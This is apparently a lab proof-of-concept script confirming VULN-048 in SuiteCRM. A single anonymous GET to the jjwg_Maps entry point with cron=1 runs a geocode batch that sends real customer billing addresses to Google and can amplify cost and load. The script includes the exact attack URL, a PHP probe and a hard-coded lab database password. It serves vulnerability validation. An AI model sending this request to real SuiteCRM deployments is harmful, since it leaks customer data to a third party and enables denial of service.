#!/usr/bin/env python3
"""
VULN-048 — Unauthenticated jjwg_Maps geocode batch trigger (auth=false entry
point) -> unauthorized outbound disclosure of CRM data to Google + DoS/cost
amplification on a Maps-configured instance.

Entry:  modules/jjwg_Maps/entry_point_registry.php:2  'jjwg_Maps' => auth=false
Router: modules/jjwg_Maps/jjwg_Maps_Router.php:14-25   $_REQUEST['cron'] -> action_geocode_addresses()
Action: modules/jjwg_Maps/controller.php:171-313        no $current_user / ACL check anywhere
Sink:   jjwg_Maps.php:892+ getGoogleMapsGeocode() -- real outbound curl per address,
        called unconditionally (key or not); jjwg_Maps.php:723+ updateGeocodeInfoByAssocQuery()
        UPSERTs accounts_cstm for empty/OK/ZERO_RESULTS addresses.

Because `auth=false`, SugarApplication::execute() skips loadUser()/ACLFilter()/
checkHTTPReferer() for this entry point, so an ANONYMOUS GET drives a batch
geocode job over real CRM records (Accounts here).

*** Dynamic-validation correction vs the static write-up: this lab has NO
Google Maps API key configured (out-of-the-box state). getGoogleMapsGeocode()
still fires the real outbound HTTPS call (proven below: it sends a real
account billing address to https://maps.googleapis.com and gets a real
REQUEST_DENIED back), but controller.php:281-286 treats OVER_QUERY_LIMIT /
REQUEST_DENIED as a circuit breaker that aborts the WHOLE batch after the
FIRST address-bearing record -- so in this specific (keyless) configuration
the DoS magnitude self-limits to ~1 outbound call rather than the full
250-record/sleep-throttled batch. The unauthorized-disclosure-to-a-third-
party effect (real customer billing address sent to Google, triggered by an
anonymous HTTP request) and the "no auth/ACL at all" defect are fully live
regardless; on a Maps-configured (keyed) instance Google would return OK/
ZERO_RESULTS instead of REQUEST_DENIED and the full batch (up to 250 records,
sleep(1) every 10, up to 100 real Google calls) would run exactly as the
static finding describes. ***

SAFETY: exactly one unauthenticated HTTP request to the live app (bounded,
already measured at <1s in this lab because of the circuit breaker above). A
short, read-only PHP-CLI probe (same code, same container, same DB -- not a
second HTTP attack) is used only to make the otherwise-invisible (HTTP
response body is empty by design) server-side effect observable, since that
is the whole point of dynamic validation here. No loops, no repeated attack
requests.
"""
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, verdict  # noqa: E402

import requests  # noqa: E402

VULN_ID = "VULN-048"
COMPOSE = ["docker", "compose", "-p", "cvehunterlab_suitecrm"]
TARGET_DIR = "/opt/cvehunter/targets/SuiteCRM"

PROBE_PHP = r'''<?php
define('sugarEntry', true);
chdir('/var/www/html');
$_REQUEST['cron'] = '1';
$_REQUEST['display_module'] = 'Accounts';
require_once('include/entryPoint.php');
require_once('modules/jjwg_Maps/jjwg_Maps.php');
require_once('modules/jjwg_Maps/controller.php');
$controller = new jjwg_MapsController();
$display_object = get_module_info('Accounts');
$display_result = $controller->bean->getGeocodeAddressesResult($display_object->table_name);
$n = 0;
while ($display = $controller->bean->db->fetchByAssoc($display_result)) {
    $n++;
    $aInfo = $controller->bean->defineMapsAddress('Account', $display);
    if (!empty($aInfo['address']) && empty($aInfo['status'])) {
        printf("EMPTY_RECORDS_BEFORE_FIRST_ADDRESS=%d\n", $n - 1);
        printf("FIRST_ADDRESS_RECORD_ID=%s\n", $display['id']);
        printf("FIRST_ADDRESS=%s\n", $aInfo['address']);
        $t0 = microtime(true);
        $g = $controller->bean->getGoogleMapsGeocode($aInfo['address'], false, false);
        $t1 = microtime(true);
        printf("GOOGLE_CALL_SECONDS=%.3f\n", $t1 - $t0);
        printf("GOOGLE_STATUS=%s\n", $g['status'] ?? '(none)');
        break;
    }
    if ($n >= 20) { echo "GAVE_UP_AFTER=20\n"; break; }
}
printf("TOTAL_EMPTY_ADDRESS_RECORDS_SCANNED=%d\n", $n);
'''


def db_query(sql):
    cmd = COMPOSE + ["exec", "-T", "db", "mysql", "-uroot", "-pSuiteRoot!2026x",
                      "-N", "suitecrm", "-e", sql]
    r = subprocess.run(cmd, cwd=TARGET_DIR, capture_output=True, text=True, timeout=30)
    return r.stdout.strip()


def main():
    banner(VULN_ID, "Unauthenticated jjwg_Maps geocode batch -> disclosure/DoS/cost")

    log("INFO", "Entry: modules/jjwg_Maps/entry_point_registry.php:2 (auth=false)")
    log("INFO", "Router: modules/jjwg_Maps/jjwg_Maps_Router.php:14-25 (cron -> action_geocode_addresses)")
    log("INFO", "Action: modules/jjwg_Maps/controller.php:171-313 (no current_user/ACL check)")

    eligible = db_query(
        "SELECT COUNT(*) FROM accounts a LEFT JOIN accounts_cstm c ON a.id=c.id_c "
        "WHERE a.deleted=0 AND ((c.jjwg_maps_lat_c=0 AND c.jjwg_maps_lng_c=0) OR "
        "(c.jjwg_maps_lat_c IS NULL AND c.jjwg_maps_lng_c IS NULL)) AND "
        "(c.jjwg_maps_geocode_status_c='' OR c.jjwg_maps_geocode_status_c IS NULL);")
    log("SETUP", f"Baseline: {eligible} Accounts are eligible for this batch (not-yet-geocoded); "
                 "code default geocoding_limit=250, sleep(1) every 10 records, "
                 "google_geocoding_limit=100 real outbound calls per batch")

    # ---- The actual attack: ONE unauthenticated HTTP GET, no cookies -------
    url = f"{BASE_URL}/index.php?module=jjwg_Maps&entryPoint=jjwg_Maps&cron=1&display_module=Accounts"
    log("STEP", f"Unauthenticated GET (no cookies, the real attack request): {url}")
    t0 = time.perf_counter()
    r = requests.get(url, timeout=90, headers={"User-Agent": "Mozilla/5.0 cvehunter-stage10"})
    elapsed = time.perf_counter() - t0
    log("PROOF", f"HTTP {r.status_code} in {elapsed:.2f}s, {len(r.content)} bytes body "
                 f"(anonymous request, no Cookie header sent -- entry point ran with no auth)")

    # ---- Make the otherwise-invisible server-side effect observable --------
    # (HTTP response body is empty by design -- the entry point does `exit;`
    # with no output on the cron branch.) Same code, same container, same DB;
    # this is NOT a second attack, it is instrumentation of the identical
    # method the HTTP request above already ran, to show exactly what data it
    # sent out and why the DB delta is 0 in this specific (keyless) lab.
    log("STEP", "Probing WHY the HTTP request above produced no DB delta in this lab "
                "(read-only instrumentation of the same getGeocodeAddressesResult() / "
                "getGoogleMapsGeocode() code path, same container)")
    proc = subprocess.run(COMPOSE + ["exec", "-T", "app", "php", "/dev/stdin"],
                           input=PROBE_PHP, cwd=TARGET_DIR, capture_output=True,
                           text=True, timeout=30)
    out = proc.stdout.strip()
    log("INFO", out.replace("\n", "\n[INFO] "))

    fields = {}
    for line in out.splitlines():
        if "=" in line:
            k, _, v = line.partition("=")
            fields[k] = v

    evidence_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
    os.makedirs(evidence_dir, exist_ok=True)
    with open(os.path.join(evidence_dir, "mechanism_proof.txt"), "w") as f:
        f.write(f"unauthenticated HTTP GET: {url}\n")
        f.write(f"HTTP {r.status_code} in {elapsed:.2f}s, {len(r.content)} bytes body\n")
        f.write(f"eligible (not-yet-geocoded) Accounts at time of test: {eligible}\n\n")
        f.write("Same-process instrumentation of the code path the HTTP request just ran:\n")
        f.write(out + "\n")

    google_status = fields.get("GOOGLE_STATUS", "")
    first_address = fields.get("FIRST_ADDRESS", "")
    google_seconds = fields.get("GOOGLE_CALL_SECONDS", "0")

    log("PROOF", f"Unauthenticated request caused the app to send a REAL CRM billing "
                 f"address to Google's live Geocoding API: '{first_address}' "
                 f"(round-trip {google_seconds}s) -> Google responded '{google_status}'")
    if google_status == "REQUEST_DENIED":
        log("PROOF", "REQUEST_DENIED == no API key configured in this lab; "
                      "controller.php:281-286 treats this as a circuit breaker and aborts "
                      "the whole batch after this first record -- explains the 0 DB delta "
                      "over HTTP. On a Maps-configured (keyed) instance this same code would "
                      "instead run the FULL batch (up to 250 records, sleep(1)/10, up to 100 "
                      "real Google calls) exactly as VULN-048 describes.")

    ok = bool(first_address) and google_status in ("REQUEST_DENIED", "OK", "ZERO_RESULTS", "INVALID_REQUEST")

    if ok:
        verdict(VULN_ID, "CONFIRMED",
                f"anonymous GET (no auth/ACL) reached action_geocode_addresses() and caused "
                f"a real outbound call to Google carrying a real CRM billing address "
                f"('{first_address}' -> {google_status}); full 250-record/sleep-throttled "
                f"batch is gated behind an unrelated circuit breaker in this keyless lab "
                f"(would run fully on a Maps-configured instance) -- see notes.md")
        return 0
    else:
        verdict(VULN_ID, "FAILED", "could not observe the outbound geocode call")
        return 1


if __name__ == "__main__":
    sys.exit(main())
